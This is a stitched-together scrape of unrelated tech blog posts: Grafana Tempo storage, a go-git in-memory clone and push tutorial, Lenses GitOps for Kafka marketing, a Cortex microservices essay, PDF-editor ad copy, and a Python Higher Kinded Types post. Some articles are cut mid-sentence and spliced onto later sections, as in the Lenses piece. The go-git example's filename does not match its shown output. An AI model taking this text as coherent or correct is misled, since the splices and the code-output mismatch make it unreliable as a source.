cool magic inside including bloom filters and compactions and I'll dive into it in its own blogpost.</p><h3 id="tempodb-is-not-tempo-">TempoDB is not Tempo!</h3><p>But a simple KV store won't cut it. When applications send us data, they will end up sending us individual spans, and not all the spans bunched together by traceID. We needed a system that could collect all the spans together, assemble them by traceID and store them in the Object Store. Basically we need to collect spans by the <em>traceID</em> and fortunately we have a lot of experience with this problem in Cortex (and Loki) where we needed to assemble all the samples by their metric for compression. It's a very robust and scalable system that uses a hash ring and we used the same system for Tempo. This guarantees us virtually infinite scalability!</p><p>Our docs are sparse now (we're working on them pronto!) but you can get some of the details here: <a href="https://grafana.com/docs/tempo/latest/architecture/">https://grafana.com/docs/tempo/latest/architecture/</a>. </p><figure><img src="https://gouthamve.dev/content/images/2020/10/image-5.png" alt=""></figure><p>I'll explain this in detail with the tempodb blogpost but the gist is, tempodb is a generic KV db built on top of an object store backend. In Tempo, we use it to index the high cardinality traceID field.</p><p>Now Tempo is not just the simple storage layer, but also does sampling if required and enforces retention and we are going to add more tracing specific features to it.</p><h3 id="tldr">TLDR?</h3><p>Overall, I can say this about Tempo, it's a <em>simple</em> but <em>scalable, easy to run </em>and <em>inexpensive</em> tracing store that relies on other systems for its …</p></div></section></article></div></div></div>

October 27, 2020 | https://ish-ar.io/tutorial-go-git/ | <a href="https://web.archive.org/web/*/https://ish-ar.io/tutorial-go-git/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><h2>Tutorial introduction and requirements</h2>
<p>Today’s article is a tutorial on how set up and use the go-git library to clone and update a repository with an in-memory filesystem.<br>
This procedure is quite useful if you want to push against or clone a repository without touching the OS filesystem and deal with permissions or temporary files.<br>
Albeit, there’s documentation about git-go, I find it not really clear and sometimes misleading due to the different versions and names of the library.<br>
For this reason, I’ve decided to share this tutorial, and hopefully will be helpful to someone.<br>
For the purpose of this tutorial, we will do everything inside a main.go file, however you might want something more sofisticated for your use case :)</p>
<p><strong>Requirements</strong>:</p>
<ul>
<li>An https Git repository (Github, Bitbucket doesn’t really matter as long as it’s accessible via https.)</li>
<li>Go installed and configured.</li>
<li>Basic Knowledge of Go.</li>
</ul>
<h2>Setting up the In-Memory Filesystem</h2>
<p>To set up the in-memory filesystem, we will use two packages storage and memfs.
The storer will contain the objects, references and other metadata (normally what the directory <code>.git</code> would do).<br>
The memfs filesystem will be our filesystem to read, create, remove any kind of file in our repository.<br>
First step, we need to create the two objects (the storer and the filesystem).</p>
<div data-language="text"><pre><code>package main

import (
        "fmt"

        billy "github.com/go-git/go-billy/v5"
        memfs "github.com/go-git/go-billy/v5/memfs"
        git "github.com/go-git/go-git/v5"
        http "github.com/go-git/go-git/v5/plumbing/transport/http"
        memory "github.com/go-git/go-git/v5/storage/memory"
)

var storer *memory.Storage
var fs billy.Filesystem

func main() {
        storer = memory.NewStorage()
        fs = memfs.New()

...</code></pre></div>
<h2>Setting up Git objects and Clone the repo</h2>
<p>Second step, in order to have our repository in the in-memory filesystem, we need to <strong>clone</strong> it and create the <strong>worktree</strong> object.<br>
The function <code>Clone()</code> will also return the Repository interface that we will then use to <code>Push()</code> to the remote.<br>
The method <code>Worktree()</code> will return the Worktree object that we will need to <code>Add()</code> &amp; <code>Commit()</code> our changes.<br>
Finally, if our repository is private, we would need to set up the basic authentication to clone it (We need the basic authentication to push anyway so better to set up it here!).</p>
<div data-language="text"><pre><code>...

        // Authentication
        auth := &amp;http.BasicAuth{
                Username: "your-git-user",
                Password: "your-git-pass",
        }

        repository := "https://github.com/your-org/your-repo"
        r, err := git.Clone(storer, fs, &amp;git.CloneOptions{
                URL:  repository,
                Auth: auth,
        })
        if err != nil {
                fmt.Printf("%v", err)
                return
        }
        fmt.Println("Repository cloned")

        w, err := r.Worktree()
        if err != nil {
                fmt.Printf("%v", err)
                return
        }</code></pre></div>
<h2>Create and commit your files</h2>
<p>Now, will we use the <code>fs</code> object to create an actual file, add &amp; commit it to the Worktree().</p>
<p><strong>NOTE</strong>:</p>
<ul>
<li>By default, the repository is always cloned into <code>"/"</code>. </li>
<li>For some reason (unknown to me), if the filename starts with ”/” it will create a folder and not a file.<br>E.g.: /hello/world.txt (world.txt would be a directory) hello/world.txt (world.txt would be a file inside the folder hello)</li>
</ul>
<div data-language="text"><pre><code>...

        // Create new file
        filePath := "my-new-ififif.txt"
        newFile, err := fs.Create(filePath)
        if err != nil {
                return
        }
        newFile.Write([]byte("My new file"))
        newFile.Close()

        // Run git status before adding the file to the worktree
        fmt.Println(w.Status())

        // git add $filePath
        w.Add(filePath)

        // Run git status after the file has been added adding to the worktree
        fmt.Println(w.Status())

        // git commit -m $message
        w.Commit("Added my new file", &amp;git.CommitOptions{})</code></pre></div>
<h2>Push and check errors</h2>
<p>The Push() will be performed using the method of the Repository interface as shown below.</p>
<div data-language="text"><pre><code>...

        //Push the code to the remote
        err = r.Push(&amp;git.PushOptions{
                RemoteName: "origin",
                Auth:       auth,
        })
        if err != nil {
                return
        }
        fmt.Println("Remote updated.", filePath)
        return
}</code></pre></div>
<p>Our final main.go would look like this: <a href="https://github.com/ish-xyz/ish-ar.io-tutorials/blob/master/tutorial-go-git/main.go">https://github.com/ish-xyz/ish-ar.io-tutorials/blob/master/tutorial-go-git/main.go</a></p>
<h2>Install and run our module</h2>
<p>Let’s try our new go module. Run the following commands:</p>
<div data-language="text"><pre><code>go mod init
go build
go run main.go

    Repository cloned
    ?? my-new-file.txt
    &lt;nil&gt;
    A  my-new-file.txt
    &lt;nil&gt;
    Remote updated. my-new-file.txt</code></pre></div>
<p>I know this is quite a specific topic, but I hope this tutorial will help someone!</p></div></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Infrastructure as code has been an important practice of DevOps for years.&nbsp;</p><p>Anyone running an Apache Kafka data infrastructure and running on Kubernetes, the chances are you’ve probably nailed defining your infrastructure this way.</p><p>If you’re running on Kubernetes, you’re likely using operators as part of your CI/CD toolchain to automate your deployments.&nbsp;</p><p>Adopting GitOps is natural evolution, whereby the state of your landscape is managed in Git (or any code repo) with automation systems ensuring the state of a deployment remains consistent with the repo.</p><p>Where we’ve seen a particular lack of maturity and best practices is in managing the application landscape of flows and microservices on technologies such as Kafka and Kubernetes.</p><p>GitOps is increasingly playing a big part of DataOps. DataOps promotes the accelerated delivery of data products through decentralized data governance, automation, self-service and lowering the skills required to operate data. GitOps brings standardization, governance and automation.&nbsp;</p><p>It’s a subject we’ve spoken about at a few events recently including at Kafka Summit this year and on DevOps.com:</p><p><iframe src="https://www.youtube.com/embed/iJygfiN-RR8" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></p><h2>What Kafka with GitOps should look like</h2><p>
When looking to automate real-time applications following DataOps, we need to be thinking about more than automating the app deployment. We need to define the correct data governance controls as part of the software delivery.&nbsp;</p><p>This means avoiding blind releasing apps where governance is an afterthought.&nbsp;</p><p>Lack of good governance will reduce the accessibility and trust in data and reduce the confidence to use the data downstream. Governance should cover the accessibility, availability, quality, integrity and confidentiality of the data.&nbsp;</p><p>We want the creator of the App, who best understands the data to be able to define the governance controls as a single package and then have it reviewed by a standard workflow.&nbsp;&nbsp;</p><p>Example: A data analyst builds their own data-processing application, but they also define the governance and compliance controls required to release it. This puts the app’s performance parameters in their hands - they decide what makes it production-ready and enterprise-grade.</p><p>When deploying Kafka on Kubernetes, it may look like this: The analyst defines the application logic in some form (such as SQL) and includes:&nbsp;</p><ul><li><p>The necessary Kafka ACLs</p></li><li><p>The data policies to mask any sensitive data</p></li><li><p>The lag and expected data throughput alerting rules</p></li><li><p>Where those events should be sent to (Slack, Pagerduty, etc)</p></li><li><p>The auditing rules to 3rd parties</p></li></ul><p>And so on...&nbsp;</p><p>This can then be pushed to Git, managed through your standard Git workflows and a merge request created, triggering a build pipeline to deploy across your different environments.&nbsp;</p><p><img src="https://images.ctfassets.net/tnuaj0t7r912/57dTrzg6Sg6OORdvRTeebS/adef2d61514ca6b0e621c6343a22c4cf/GetYourGitOps.png" alt="GetYourGitOps"></p><p>If you’re working with Kafka and doing this, there are two areas we need to consider:</p><ol><li><p>How to define the the application &amp; governance landscape as config</p></li><li><p>How to best automate deployment in an infrastructure-agnostic and secure way.</p></li></ol><h2>Defining the App and Governance as config</h2><p>
Lenses provide a full experience for data practitioners (developers, analysts, even business users) to build real-time applications deploying on a Kafka &amp; Kubernetes data platform by ensuring all data is catalogued, made accessible and explorable.&nbsp;</p><p>The<a href="https://docs.lenses.io/4.0/tools/cli/"> Lenses CLI client</a> allows your “data landscape” to be exported as declarative

and best maintain a consistent state</h2><p>
Here’s where there are a few different methods that are commonly adopted.&nbsp;</p><h3>Push Methods</h3><p>This is the method we see most organizations adopt. Teams will push to Git which will trigger a deploy pipeline in any CI/CD (such as Jenkins) using various APIs in Kafka, Kafka Connect, Kubernetes or wherever you’re running your applications. It also makes it difficult for Jenkins to monitor the desired state and ensure consistency with Git.</p><p>Of course you also need to open up the firewall to allow Jenkins into your data platform.</p><p><img src="https://images.ctfassets.net/tnuaj0t7r912/74tcs9DG4E3jGe7mk34fku/3a4d4d3bd393f1de19d92d0f659ad9ff/GetYourGitOps_Pushing.png" alt="Traditional CI/CD push for Kafka automation"></p><h4>K8 Operator for Kafka</h4><p>You can use a Kubernetes operator to push the desired state. Jenkins or your CI/CD tool still needs to penetrate the data platform environment, however, which may increase security risk. Then you can use a Kubernetes operator (such as Strimzi’s) to monitor the desired state and apply the state to Kafka via APIs. This method is often used to operate the Kafka infrastructure, scale up Brokers etc. rather than to operate at the data layer (Topics, ACLs etc.)</p><p><img src="https://images.ctfassets.net/tnuaj0t7r912/47dnPqN0cGXI46XbqGx9gg/25f72efd0b1a927661c5dd0359e9916c/GetYourGitOps_K8s.png" alt="Traditional Kubernetes operator for GitOps"></p><h3>Pull Methods</h3><p>Pull methods are still based on an operator pattern, but through watching Git rather than watching Kubernetes.&nbsp;</p><p>This allows the pattern to work independently of using Kubernetes. </p><p><img src="https://images.ctfassets.net/tnuaj0t7r912/RrcOkBDI9jgcm4KXBL9ca/73f4b286f539b47886b4854803fd7917/gitops_graffic_lenses_operator.png" alt="Lenses Operator for GitOps"></p><p>The operator is a Lenses operator which can run either inside or outside your data platform.&nbsp; The operator speaks with Lenses which applies the desired state to the data platform including any real-time applications. So for example for anyone using <a href="https://lenses.io/blog/2020/07/Why-new-Streaming-SQL-opens-up-data-platform/">Lenses Streaming SQL</a>, this would deploy the application over Kubernetes.&nbsp;</p><p>The desired state of course would have been created within a separate Lenses environment and exported as config with the CLI before being pushed into Git.&nbsp;</p><p>The benefit of this pull deployment approach is it provides a more secure environment by not needing your CI/CD to access your infrastructure, it also ensures your applications are secured, governed and audited in Git with the state actively monitored and the ability to rollback at any time.&nbsp;&nbsp;</p><p><b>You can practice GitOps in the free </b><a href="https://lenses.io/box/">Kafka+Lenses docker developer Box </a><b>now.&nbsp; If you’re interested in an early access to the Lenses Operator: get in touch with us now</b><a href="https://lenses.io/contact-us/"> by form</a><b> or via </b><a target="_blank" href="https://launchpass.com/lensesio">Slack.</a><b> </b></p></div></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Organizations that operate microservices/service-oriented architecture face a variety of technical and people related problems. Over the past few years, companies have been migrating massive monolithic applications into smaller microservices (think services that do one thing, like <em>archive a pdf</em>) or even service oriented architectures (e.g. service-per-domain, <em>payments, billing, auth</em>).</p><p>There are undoubtedly many issues that come from monolithic architectures: easy to tightly couple domains and data, slower deployment process, and long test runs to name a few. Breaking the monolith can seem like a panacea for these issues. An SOA can provide team level ownership of domains and their systems, data is decoupled, and features/fixes can be deployed separately. Unfortunately, a SOA comes with its own set of issues.</p><p>Monoliths have been around for a while. There's a lot that's been written about "taming the monolith". As we get to work building Cortex, we've been talking to engineers about their experiences dealing with microservice architectures. Here's some things we've learned about taming your microservices.</p><p>A monolith, for all its warts, is simple to reason about. There are no network calls. There's no overhead to calling a function elsewhere in the codebase. If you're using a typed language, you can catch API changes at compile time. All the code is in one place – if you're so inclined, you can easily peek under the hood.</p><p>An SOA brings with it a suite of technical challenges, including operational complexity and performance hits. You now have to think about:</p><ul role="list"><li>Network latency</li><li>API versioning - what if the payments team makes a breaking change to its API without notifying me?</li><li>Network issues - what happens if I don't receive confirmation that the payment went through?</li><li>Change management/releases - when an issue occurs</li></ul><p>Yet, these technical challenges are the least of your worries.</p><h2>PEBCAK - Problem exists between chair and keyboard</h2><p>While it may sound strange to think that cultural and people problems are a significant challenge stemming from architectural choices, keep in mind that most organizations move to an SOA to scale their team, not their software.</p><p><strong>Distributing ownership of domains, data, and release cadence across services and teams can increase the velocity of your engineering org.</strong></p><p>Unfortunately, distributing ownership does just that - teams start diverging in their operational procedures, documentation practices, and more. As an organization scales, this can wreak havoc on productivity, and ultimately bring your velocity back to square one.</p><p>People, process, and cultural issues around service oriented architectures have far reaching consequences:</p><ul role="list"><li>Ramping up engineers becomes costly - each team maintains their own processes. An engineer moving between teams may have to learn as much as a brand new hire.</li><li>Operational triage takes longer - tribal knowledge dissipates as an organization grows, making it harder to answer questions such as: what services exist, what they do, and who owns them</li><li>Communication overhead between teams - oversharing information is noisy, undersharing (e.g. when making API changes) can, in the worst case, cause outages or functionality issues and directly impact the bottom line</li></ul><p>Looking to scale your team? It's time to start thinking these challenges and how you can counter them.</p><p>There's no silver bullet to solve these problems. No combination of tools or processes can protect you. However, prevention really is better than the cure.</p><p>Think of it like a flu shot - you know its flu season, getting the flu sucks, and even though you may still get the flu, you'll never regret setting yourself up for success.</p><h2>Spec first design</h2><p>An excellent habit to promote is thinking about APIs and data models before jumping into the implementation.</p><h3>API Design</h3><p>It's important to ensure your SOA doesn't turn into a <em>distributed monolith</em>.</p><p>Signs of a distributed monolith:</p><ul role="list"><li>No separation of concerns</li><li>Shared databases and data models</li><li>Releasing one service requires coordination of deploys across multiple other services</li><li>Consuming a service's APIs requires knowledge about its data models, side effects, etc</li></ul><p>One way to prevent this is following the Amazon model - APIs are the only way teams communicate. This means that a service owner should:</p><ul role="list"><li>Think about their API request/responses <strong>before implementation</strong></li><li><strong>Share the API for review</strong> so that use cases for dependents are well covered</li><li><strong>Communicate API changes</strong> ahead of time</li><li><strong>Version their APIs</strong> to maintain backwards compatibility</li></ul><p>This workflow provides additional benefits when used in conjunction with tooling, such as OpenAPI or gRPC. If schemas and APIs are designed ahead of time, you can use:</p><ul role="list"><li><strong>Code gen</strong> for clients across different languages</li><li>Catch breaking changes to your API at <strong>build time</strong></li><li>Use your code review process to loop in the right stakeholders <em>before a change is released</em></li><li><strong>Contract testing</strong> to ensure you don't go out of compliance with your predetermined schema</li></ul><figure id="w-node-9def8f3c3ff0-f078b551"><p><img src="https://assets.website-files.com/5ec5ad145468d2d2ff78b364/5ecd2f3387ce026d1c67c8e6_JqjXbRYzUWfOUOAN.png" alt=""></p></figure><p>Atlassian is an example of successfully using spec-first API design to improve their development lifecycle. I found <a href="https://www.atlassian.com/blog/technology/spec-first-api-development"><strong>https://www.atlassian.com/blog/technology/spec-first-api-development</strong></a> to be an excellent overview of using OpenAPI as the tooling to enable spec-first development.</p><h3>Data models</h3><p>The breaking point for a monolith is when multiple teams start depending on the same data models across domains. This slows down the development cadence across the org and the resulting spaghetti data models make it exponentially more difficult to reason about the code base.</p><p>It's easy to go down the same route in an SOA as well. There are some habits that help prevent this nightmare:</p><ul role="list"><li>Separate data stores for each service</li><li>Thinking carefully about data models and links before implementing APIs</li><li>Reducing dependencies at the data level between services - for example, store reference IDs to resources in a different service, and fetch data through their API</li><li>Ensuring stakeholders (business, developers, service consumers) don't build tooling directly on your data. This locks in your data model and prevents you from iterating as a service owner. Instead, expose data (with its own contract) through APIs or analytical data streams.</li></ul><h2>Standardization of platform/process</h2><p>There's one obvious solution to "each team doing things their own way" - make it easy for teams to do things in a standardized way.</p><p>Atlassian, for example, has built out an internal PaaS that is essentially a thin wrapper around AWS. By doing so, developers are provisioned their desired resources but the platform automatically augments it with standard monitoring, logging, and more.</p><p>Well designed tooling that provides a standard way of doing things speeds up developer velocity and makes sure teams are working in consistent ways.</p><p>This even extends to documentation. Spotify and Atlassian have built internal tooling that standardizes information discovery around their microservices. System-Z at Spotify and <a href="https://blog.developer.atlassian.com/why-atlassian-uses-an-internal-paas-to-regulate-aws-access/"><strong>Microscope at Atlassian</strong></a> provide a source of truth for details about each service, such as system ownership, links to documentation/runbooks, and recent deploys. What makes them even more powerful is that they are the entrypoint into further information about services – on-call rotations, links to monitoring dashboards, logging, etc.</p><figure id="w-node-a1aa57605d7f-f078b551"><p><img src="https://assets.website-files.com/5ec5ad145468d2d2ff78b364/5ecd2f37ddc5afe80353230b_vpQZUjpsspzaKCVQ.png" alt=""></p></figure><p>This kind of standardization of information improves engineering ramp up time and operational efficiency - all services are operated in the same way and developers have a single source to look for critical information about their services.</p><p>Many organizations end up building an internal service registry for humans after the problem has gotten out of hand – too many services, growing teams and turnover, remote developers, etc.</p><p>Cortex provides a standard, opinionated way to organize information about all of your services and enables functionality such as:</p><ul role="list"><li>A dashboard to answer questions such as "what services exist?", "who owns this service?", "where are the runbooks for this service?"</li><li>An audit report that shows you the health of your services: does every service have an owner, an oncall rotation, etc.</li></ul><figure id="w-node-66b03bd1403c-f078b551"><p><img src="https://assets.website-files.com/5ec5ad145468d2d2ff78b364/5ecd2f3276ebd32f1e32f034_YyoCvebvNYItDndV.png" alt=""></p></figure><ul role="list"><li>Integrations with third party tools - for example, when Pagerduty triggers an alert, Cortex can send a slack message with information about the service such as ownership, latest commits from github, latest deploys, and more.</li></ul><p>Reach out to us on our home page to request a demo, we'd love to show you what we've built and help prevent some of the headaches that come with a service oriented architecture.

Your document format speaks volumes before the eyes ever glaze the title. In a business setting, If you’re not using PDF, you’re guilty of amateurism until proven otherwise. That’s why HR departments, Startup founders, freelancers, and rising talents add text to PDF to exchange serious communication.</p><h2>Write on PDF to stay organized and productive</h2><p>Typing on a PDF was always a troublesome task that would often end up with a call to the IT department. And that’s just awful. You’re losing both the time and mental bandwidth to do the actual work. Also, people in IT probably dislike your face if you’re nagging them to be your PDF editor.</p><p>‍<br>Choose a PDF document that needs extra words, and upload it to Good Annotations. Then, focus on your title, subtitle, text body, and callouts for important elements. Let the IT side and geeky tasks to us! </p><h2>Use red callouts to edit pdf for immediate attention</h2><p>The PDF editor comes with an array of tools that will help you add text to pdf.

Nobody likes to be screamed at through the screen. With the right callout, you can communicate in a robust and impactful way via your pdf documents. </p><h2>Add yellow callouts to PDFs for vibe and appreciation</h2><p>Bring out the right vibe with the right note. Nothing speaks,<em> I appreciate you</em>, better than an energetic yellow note under a well-done task. Your team members, employees, and employers all seek affirmation and appreciation. Tell them what’s good by adding a yellow callout to your PDF document.</p><h2>Add text to PDF with an entirely online PDF editor</h2><p>You don’t have to be boxed at your desk with your back bent and face inched away from the screen. Add text to pdf entirely online via Good Annotations from anywhere in the world, and any room, table, or street. Add text to pdf on trams, tubes, and tractors. Don’t drive and write on pdf, thought. That’s illegal. </p><h2>Write on PDF across all devices and gadgets</h2><p>If you can open Google, you can use Good Annotations, and if you can use Good Annotations, you can write on PDF from your device. Fire up any laptop, PC, tablet, smartphone, smart TV, or even a smart mirror and add text to your PDF.</p><h2>Fully free and beyond easy to use PDF editor </h2><p>Write on your pdf files for free. Entirely free, without ever having to leave a bank card, PayPal details, or provide your billing address.

<p><code>dry-python/returns@0.15</code> is <a href="https://github.com/dry-python/returns/releases/tag/0.15.0">released</a>! And it means that now anyone can use our Higher Kinded Types emulation in their projects.</p>

<p>In this post I will explain:</p>
<ul>
  <li>What Higher Kinded Types (HKTs) are and why they are useful</li>
  <li>How they are implemented and what limitations there are</li>
  <li>How can you use them in your own projects</li>
</ul>

<p>Without further ado, let’s talk about typing!</p>


      <h2 id="simple-types">
        
        <a href="#simple-types">Simple types</a>
        
      </h2>

<p>Typing is layered. Like a good cake. There are at least three layers that we are going to cover.</p>

<p>Simple (or flat) typing, like <code>x: int = 1</code>. This allows us to express simple types and their transformations. Like <code>int -&gt; str</code>:</p>

<div><div><pre><code><span>def</span> <span>stringify</span><span>(</span><span>arg</span><span>:</span> <span>int</span><span>)</span> <span>-&gt;</span> <span>str</span><span>:</span>
    <span>return</span> <span>str</span><span>(</span><span>arg</span><span>)</span>
</code></pre></div></div>

<p>A lot of languages like <code>go</code> and <code>php</code> do not go beyond this line. And they still work pretty well! These types are also sometimes called <code>*</code>-kinded. It can be understood as “a place for just a single type argument”.</p>


    
      <h2 id="generic">
        
        <a href="#generic">Generic</a>
        
      </h2>

<p>Generic level is required to express “nested” types. For example, you have a list of integers. In Python we annotate it as <code>List[int]</code> or <a href="https://www.python.org/dev/peps/pep-0585/"><code>list[int]</code></a> in Python <code>3.9</code>. This allows us to have types with other types as arguments. <code>List</code> can receive <code>int</code> or <code>str</code> or even another <code>List</code> as the type argument. This way we can nest type and types start to have their own structure.</p>

<p>Generics are much more interesting than simple types. And they can have multiple type arguments:</p>
<ul>
  <li>List has one: for values, so it has a kind of <code>* -&gt; *</code>. It can be understood as a type transformation <code>List -&gt; T = List[T]</code></li>
  <li>Dict has two: for keys and values, so it has a kind of <code>* -&gt; * -&gt; *</code>. It can be understood as a type transformation <code>Dict -&gt; K -&gt; V = Dict[K, V]</code></li>
  <li>And so on!</li>
</ul>

<p>This would be very helpful for us in the future, I promise.</p>

<p>We can also write transformations for generic types:</p>

<div><div><pre><code><span>def</span> <span>stringify_list_items</span><span>(</span><span>arg</span><span>:</span> <span>List</span><span>[</span><span>int</span><span>])</span> <span>-&gt;</span> <span>List</span><span>[</span><span>str</span><span>]:</span>
    <span>return</span> <span>[</span><span>str</span><span>(</span><span>item</span><span>)</span> <span>for</span> <span>item</span> <span>in</span> <span>arg</span><span>]</span>
</code></pre></div></div>

<p>But, that is where things begin to be quite complicated.</p>

<p>How can this function work with other iterables like <code>set</code>, <code>frozenset</code>, <code>tuple</code>?
We can express this in Python as easy as:</p>

<div><div><pre><code><span>def</span> <span>stringify_iterable_items</span><span>(</span><span>arg</span><span>):</span>
    <span>return</span> <span>type</span><span>(</span><span>arg</span><span>)(</span><span>str</span><span>(</span><span>item</span><span>)</span> <span>for</span> <span>item</span> <span>in</span> <span>arg</span><span>)</span>
</code></pre></div></div>

<p>But the typing part would be quite challenging. Let’s try several things.</p>


    
      <h3 id="common-interface">
        
        <a href="#common-interface">Common interface</a>
        
      </h3>

<p>The first obvious thing to try is <code>Iterable</code> protocol. It is builtin into Python and does what we need.</p>

<div><div><pre><code><span>from</span> <span>typing</span> <span>import</span> <span>Iterable</span>

<span>def</span> <span>stringify_iterable_items</span><span>(</span><span>arg</span><span>:</span> <span>Iterable</span><span>[</span><span>int</span><span>])</span> <span>-&gt;</span> <span>Iterable</span><span>[</span><span>str</span><span>]:</span>
    <span>return</span> <span>type</span><span>(</span><span>arg</span><span>)(</span><span>str</span><span>(</span><span>item</span><span>)</span> <span>for</span> <span>item</span> <span>in</span> <span>arg</span><span>)</span>
</code></pre></div></div>

<p>Let’s try it out:</p>

<div><div><pre><code><span>reveal_type</span><span>(</span><span>stringify_iterable_items</span><span>([</span><span>1</span><span>,</span> <span>2</span><span>,</span> <span>3</span><span>]))</span>
<span># Revealed type is 'typing.Iterable[builtins.str]'
</span>
<span>reveal_type</span><span>(</span><span>stringify_iterable_items</span><span>({</span><span>1</span><span>,</span> <span>2</span><span>,</span> <span>3</span><span>}))</span>
<span>#  Revealed type is 'typing.Iterable[builtins.str]'
</span>
<span>reveal_type</span><span>(</span><span>stringify_iterable_items</span><span>((</span><span>1</span><span>,</span> <span>2</span><span>,</span> <span>3</span><span>)))</span>
<span>#  Revealed type is 'typing.Iterable[builtins.str]'
</span></code></pre></div></div>

<p>You can see that a part of our typing information is lost. We pass <code>List</code> or <code>Set</code> or <code>Tuple</code> and always get the <code>Iterable</code> back.</p>

<p>Sometimes - this is ok. But, in some cases, this is not enough. Let’s try some other technique!</p>


    
      <h3 id="methods">
        
        <a href="#methods">Methods</a>
        
      </h3>

<p>One can say: we are all using Object-Oriented Programming! Why cannot we just create a new method for each type we need? And specify the exact return type there!</p>

<p>Well, it is a possible solution. But, there are some reasonable problems:</p>

<ul>
  <li>You cannot add methods to existing types and extend them with this approach. Only create new ones, probably via subtyping, and add new methods there. In our example you would have to create your own versions of <code>List</code>, <code>Set</code>, and <code>Tuple</code>. Which is not desirable in most situations</li>
  <li>It really it starts to be messy if you have a lot of methods to add. A type with more than <code>X</code> (choose the number yourself) methods starts to be really complex to read, understand, and use. Instead, using separate functions is much easier, because we don’t have to put everything into a single namespace</li>
</ul>

<p>Let’s try something else.</p>


    
      <h3 id="overloads">
        
        <a href="#overloads">overloads</a>
        
      </h3>

<p>Another solution that might solve our problem is using the <code>@overload</code> decorator with proper types for each required case.</p>

<div><div><pre><code><span>from</span> <span>typing</span> <span>import</span> <span>List</span><span>,</span> <span>Set</span><span>,</span> <span>overload</span>

<span>@</span><span>overload</span>
<span>def</span> <span>stringify_iterable_items</span><span>(</span><span>arg</span><span>:</span> <span>List</span><span>[</span><span>int</span><span>])</span> <span>-&gt;</span> <span>List</span><span>[</span><span>str</span><span>]:</span>
    <span>...</span>

<span>@</span><span>overload</span>
<span>def</span> <span>stringify_iterable_items</span><span>(</span><span>arg</span><span>:</span> <span>Set</span><span>[</span><span>int</span><span>])</span> <span>-&gt;</span> <span>Set</span><span>[</span><span>str</span><span>]:</span>
    <span>...</span>

<span>def</span> <span>stringify_iterable_items</span><span>(</span><span>arg</span><span>):</span>
    <span>return</span> <span>type</span><span>(</span><span>arg</span><span>)(</span><span>str</span><span>(</span><span>item</span><span>)</span> <span>for</span> <span>item</span> <span>in</span> <span>arg</span><span>)</span>
</code></pre></div></div>

<p>Let’s test it:</p>

<div><div><pre><code><span>reveal_type</span><span>(</span><span>stringify_iterable_items</span><span>([</span><span>1</span><span>,</span> <span>2</span><span>]))</span>
<span># Revealed type is 'builtins.list[builtins.str]'
</span>
<span>reveal_type</span><span>(</span><span>stringify_iterable_items</span><span>({</span><span>1</span><span>,</span> <span>2</span><span>}))</span>
<span># Revealed type is 'builtins.set[builtins.str]'
</span></code></pre></div></div>

<p>Awesome! Looks like we’ve achieved our goal, haven’t we? But, there’s a new problem. We have to manually list all possible cases in a function’s signature. This works for cases when all possible arguments and outcomes are known in advance. But, not in this case. In Python <code>Iterable</code> is a protocol. We can use this function with any type with <code>__iter__</code> method defined: with both builtin and custom types. So, the number of possible arguments and outcomes is endless.</p>

<p>To illusrate the problem, let’s see what happens for <code>Tuple</code> which is not listed in the function’s overloads:</p>

<div><div><pre><code><span>reveal_type</span><span>(</span><span>stringify_iterable_items</span><span>((</span><span>1</span><span>,</span> <span>2</span><span>,</span> <span>3</span><span>)))</span>
<span># error: No overload variant of "stringify_iterable_items" matches argument type "Tuple[int, int, int]"
</span></code></pre></div></div>

<p>We, in <code>dry-python</code> <a href="https://github.com/dry-python/returns/blob/0.14.0/returns/_generated/converters/flatten.pyi">used this technique</a> with <code>@overload</code> decorator for our previous versions. This allowed us to write correct definitions of functions working with generic types. But, they were limited to the pre-defined set of our own types. And we wanted to allow our users to create their custom types based on our interfaces. With the full existing code reuse.</p>


    
      <h2 id="higher-kinded-types">
        
        <a href="#higher-kinded-types">Higher Kinded Types</a>
        
      </h2>

<p>That’s where the idea of Higher Kinded Types becomes useful. We need HKTs when we want to change the inner structure of generics with full type information preserving and openness to the extension. In theory, you can write something like:</p>

<div><div><pre><code><span>from</span> <span>typing</span> <span>import</span> <span>Iterable</span>

<span>T</span> <span>=</span> <span>TypeVar</span><span>(</span><span>'T'</span><span>,</span> <span>bound</span><span>=</span><span>Iterable</span><span>)</span>

<span>def</span> <span>stringify_iterable_items</span><span>(</span><span>arg</span><span>:</span> <span>T</span><span>[</span><span>int</span><span>])</span> <span>-&gt;</span> <span>T</span><span>[</span><span>str</span><span>]:</span>
    <span>return</span> <span>type</span><span>(</span><span>arg</span><span>)(</span><span>str</span><span>(</span><span>item</span><span>)</span> <span>for</span> <span>item</span> <span>in</span> <span>arg</span><span>)</span>
</code></pre></div></div>

<p>And this would solve our problem! What happens here is that we abstract away the <code>Iterable</code> type itself. And then ask <code>mypy</code> to figure this out for us.</p>

<p>This way we can potentially have <code>stringify_iterable_items</code> working for any <code>Iterable</code> type, but with the exact same type returned back without any information lost. And it would work for all types.</p>

<div><div><pre><code><span>reveal_type</span><span>(</span><span>stringify_iterable_items</span><span>([</span><span>1</span><span>,</span> <span>2</span><span>]))</span>
<span># Revealed type is 'builtins.list[builtins.str]'
</span>
<span>reveal_type</span><span>(</span><span>stringify_iterable_items</span><span>({</span><span>1</span><span>,</span> <span>2</span><span>}))</span>
<span># Revealed type is 'builtins.set[builtins.str]'
</span>
<span>reveal_type</span><span>(</span><span>stringify_iterable_items</span><span>(</span><span>MyCustomIterable</span><span>(</span><span>1</span><span>,</span> <span>2</span><span>)))</span>
<span># Revealed type is 'my_module.MyCustomIterable[builtins.str]'
</span></code></pre></div></div>

<p>Unfortunately, <a href="https://github.com/python/typing/issues/548">it is not supported</a> at the moment.</p>


    
      <h3 id="emulation">
        
        <a href="#emulation">Emulation</a>
        
      </h3>

<p>Turns out we are not alone in this situation. There are multiple languages where Higher Kinded Types are not natively supported yet. But, they can be emulated:</p>

<ul>
  <li><a href="https://github.com/gcanti/fp-ts/blob/master/docs/guides/HKT.md">TypeScript</a></li>
  <li><a href="https://bow-swift.io/docs/fp-concepts/higher-kinded-types/">Swift</a></li>
  <li><a href="https://arrow-kt.io/docs/0.10/patterns/glossary/#higher-kinds">Kotlin</a></li>
</ul>

